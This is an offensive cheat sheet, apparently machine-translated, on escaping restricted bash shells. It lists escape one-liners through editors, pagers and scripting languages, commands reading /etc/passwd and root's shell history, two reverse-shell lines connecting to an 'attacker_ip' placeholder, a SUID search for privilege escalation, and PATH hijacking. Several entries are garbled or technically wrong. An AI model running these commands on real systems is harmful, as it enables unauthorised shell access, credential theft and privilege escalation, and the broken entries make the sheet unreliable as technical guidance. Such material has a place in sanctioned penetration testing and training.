# Bash Jail Escape Encyclopedia

## escape decision tree

```
restricted shell (rbash/rksh)
├── Can it be used cd?
│   ├── able → cd /; sh switch to full shell
│   └── cannot → Find an editor/Other commands
├── Can I use quotation marks?/escape?
│   ├── able → `whoami` or $(whoami)
│   └── cannot → Find other ways to execute commands
├── Can access special files?
│   ├── /dev/tcp → rebound shell
│   ├── /proc → Read sensitive files
│   └── can read HISTFILE → Read history command
└── Is there a command whitelist??
    ├── vi/vim → :!/bin/sh escape
    ├── awk → awk 'BEGIN {system("id")}'
    ├── find → find ... -exec
    └── python/perl → Execute command directly
```

## Escape techniques

### 1. Editor escape
```bash
vi/vim: :!/bin/sh  or  :!/bin/bash
vim:   :shell
less:  !/bin/sh
more:  !/bin/sh
man:   !/bin/sh
```

### 2. Programming language escape
```bash
awk:    awk 'BEGIN {system("whoami")}'
perl:   perl -e 'system("whoami")'
python: python -c 'import os; os.system("whoami")'
ruby:   ruby -e 'system("whoami")'
lua:    lua -e 'os.execute("whoami")'
```

### 3. File operation escape
```bash
find:   find / -exec whoami \;
dd:     dd if=/dev/null of=/dev/null
cp:     cp /dev/null /tmp/a; cat /tmp/a
```

### 4. special file descriptor
```bash
# read /etc/passwd
cat /etc/passwd
dd if=/etc/passwd
```

### 5. Read history command
```bash
cat ~/.bash_history
cat /root/.bash_history
```

### 6. rebound Shell
```bash
bash -i >& /dev/tcp/attacker_ip/port 0>&1
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## rbash Special restrictions

| limit | Bypass method |
|------|---------|
| cannot cd | `cd /; /bin/bash` |
| Cannot be used / | Use relative paths or built-in commands |
| Cannot be used $() | backtick `` `$var` `` |
| Cannot use environment variables | Inherit the parent process environment |
| cannot redirect | `/dev/null` write file |

## use SUID Elevate privileges

```bash
# Find SUID document
find / -perm -4000 2>/dev/null

# Common rights escalations SUID
/usr/bin/sudo
/usr/bin/python
/usr/bin/perl
/bin/more
/bin/less
/bin/awk
/bin/nice
```

## use Path variable

```bash
# If it can be set PATH
export PATH=/tmp:$PATH
# exist /tmp Place malicious programs
```
